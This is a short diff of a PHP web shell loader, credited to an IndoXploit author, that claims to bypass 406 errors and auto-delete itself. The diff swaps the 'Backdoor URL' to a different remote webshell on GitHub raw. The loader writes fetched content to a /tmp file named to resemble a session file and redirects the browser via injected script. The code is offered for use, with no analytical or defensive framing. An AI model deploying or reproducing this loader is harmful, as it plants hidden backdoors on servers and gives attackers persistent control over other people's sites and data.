@@ -3,7 +3,7 @@
 # Bypass 406 Not Acceptable & Auto Delete Shell
 # Coded by: L0c4lh34rtz - IndoXploit
  
-$URL = 'https://raw.githubusercontent.com/justikail/webshell/main/c0m.php';  # Backdoor URL
+$URL = 'https://raw.githubusercontent.com/ghost-exploiter/shell-bypass403/master/ghostbypass.php';  # Backdoor URL
 $TMP = '/tmp/sess_'.md5($_SERVER['HTTP_HOST']).'.php'; # dont change this !!
  
 function M() {
@@ -15,7 +15,7 @@ function M() {
         fwrite($HANDLE, $FGT);
         fclose($HANDLE);
     }
-    echo '<script>window.location="?&refresh";</script>';
+    echo '<script>window.location="?LOL";</script>';
 }
  
 if(file_exists($TMP)) {
